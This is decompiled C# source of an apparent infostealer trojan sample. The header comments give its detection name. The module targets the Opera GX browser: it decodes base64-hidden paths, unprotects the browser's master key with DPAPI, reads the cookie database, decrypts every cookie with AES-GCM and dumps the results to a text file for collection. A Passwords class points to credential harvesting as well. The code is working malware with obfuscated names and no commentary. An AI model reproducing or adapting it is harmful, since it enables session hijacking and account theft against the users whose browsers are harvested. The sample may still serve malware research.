// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.Magazonch.lapaplpal
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.Data.Common;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace AlphaCentavr.Magazonch
{
  public class lapaplpal
  {
    public string OperaGxCookiePath = lapaplpal.myfato("QzpcVXNlcnNc") + Environment.UserName + lapaplpal.myfato("XEFwcERhdGFcUm9hbWluZ1xPcGVyYSBTb2Z0d2FyZVxPcGVyYSBHWCBTdGFibGVcQ29va2llcw==");
    public string OperaGxKeyPath = lapaplpal.myfato("QzpcVXNlcnNc") + Environment.UserName + lapaplpal.myfato("XEFwcERhdGFcUm9hbWluZ1xPcGVyYSBTb2Z0d2FyZVxPcGVyYSBHWCBTdGFibGVcTG9jYWwgU3RhdGU=");
    public static string OperaCookies;

    private static string myfato(string kiasaalisa) => Encoding.ASCII.GetString(Convert.FromBase64String(kiasaalisa));

    public bool exitsuper() => File.Exists(this.OperaGxCookiePath);

    public bool KeyExists() => File.Exists(this.OperaGxKeyPath);

    public List<lapaplpal.Cookie> tintobrass(byte[] key)
    {
      List<lapaplpal.Cookie> cookieList = new List<lapaplpal.Cookie>();
      if (!this.exitsuper())
        throw new FileNotFoundException("Cant find cookie store", this.OperaGxCookiePath);
      using (SQLiteConnection sqLiteConnection = new SQLiteConnection("Data Source=" + this.OperaGxCookiePath + ";pooling=false"))
      {
        using (SQLiteCommand command = sqLiteConnection.CreateCommand())
        {
          ((DbCommand) command).CommandText = "SELECT name,encrypted_value,host_key FROM cookies";
          ((DbConnection) sqLiteConnection).Open();
          using (SQLiteDataReader sqLiteDataReader = command.ExecuteReader())
          {
            while (((DbDataReader) sqLiteDataReader).Read())
            {
              cookieList.Add(new lapaplpal.Cookie()
              {
                Name = ((DbDataReader) sqLiteDataReader).GetString(0),
                Value = this.DecryptWithKey((byte[]) ((DbDataReader) sqLiteDataReader)[1], key, 3),
                HostName = ((DbDataReader) sqLiteDataReader).GetString(2)
              });
              checked { ++ChelovechkivPope.rertrtebvbb; }
            }
          }
          ((DbConnection) sqLiteConnection).Close();
        }
      }
      return cookieList;
    }

    public byte[] GetKey() => ProtectedData.Unprotect(((IEnumerable<byte>) Convert.FromBase64String(((object) JObject.Parse(File.ReadAllText(this.OperaGxKeyPath))["os_crypt"][(object) "encrypted_key"]).ToString())).Skip<byte>(5).ToArray<byte>(), (byte[]) null, DataProtectionScope.LocalMachine);

    private string DecryptWithKey(byte[] msg, byte[] key, int nonSecretPayloadLength)
    {
      if (key == null || key.Length != 32)
        throw new ArgumentException(string.Format("Key needs to be {0} bit!", (object) 256), nameof (key));
      if (msg == null || msg.Length == 0)
        throw new ArgumentException("Message required!", "message");
      using (MemoryStream input = new MemoryStream(msg))
      {
        using (BinaryReader binaryReader = new BinaryReader((Stream) input))
        {
          binaryReader.ReadBytes(nonSecretPayloadLength);
          byte[] numArray1 = binaryReader.ReadBytes(12);
          GcmBlockCipher gcmBlockCipher = new GcmBlockCipher((IBlockCipher) new AesEngine());
          AeadParameters aeadParameters = new AeadParameters(new KeyParameter(key), 128, numArray1);
          gcmBlockCipher.Init(false, (ICipherParameters) aeadParameters);
          byte[] numArray2 = binaryReader.ReadBytes(msg.Length);
          byte[] bytes = new byte[gcmBlockCipher.GetOutputSize(numArray2.Length)];
          try
          {
            int num = gcmBlockCipher.ProcessBytes(numArray2, 0, numArray2.Length, bytes, 0);
            gcmBlockCipher.DoFinal(bytes, num);
          }
          catch (InvalidCipherTextException ex)
          {
            return (string) null;
          }
          return Encoding.Default.GetString(bytes);
        }
      }
    }

    public static void steg2()
    {
      try
      {
        StringBuilder stringBuilder = new StringBuilder();
        lapaplpal lapaplpal = new lapaplpal();
        Directory.CreateDirectory(glantrah.ekranirovan + lapaplpal.myfato("XFxCcm93c2Vyc1xcT3BlcmE="));
        lapaplpal.OperaCookies = glantrah.ekranirovan + lapaplpal.myfato("XFxCcm93c2Vyc1xcT3BlcmFcXENvb2tpZXNfT3BlcmEudHh0");
        if (lapaplpal.exitsuper() && lapaplpal.KeyExists())
        {
          foreach (lapaplpal.Cookie cookie in lapaplpal.tintobrass(lapaplpal.GetKey()))
            stringBuilder.AppendLine(cookie.HostName + "    FALSE  \\  TRUE    1644287341.606948    " + cookie.Name + "  " + cookie.Value);
        }
        using (StreamWriter text = File.CreateText(lapaplpal.OperaCookies))
          text.Write((object) stringBuilder);
      }
      catch (Exception ex)
      {
      }
    }

    public class Cookie
    {
      public string HostName { get; set; }

      public string Name { get; set; }

      public string Value { get; set; }
    }

    public class Cookiee
    {
      public string hostname { get; set; }

      public string name { get; set; }

      public string value { get; set; }
    }

    public class Passwords
    {
      public string url { get; set; }

      public string username { get; set; }

      public string password { get; set; }
    }
  }
}
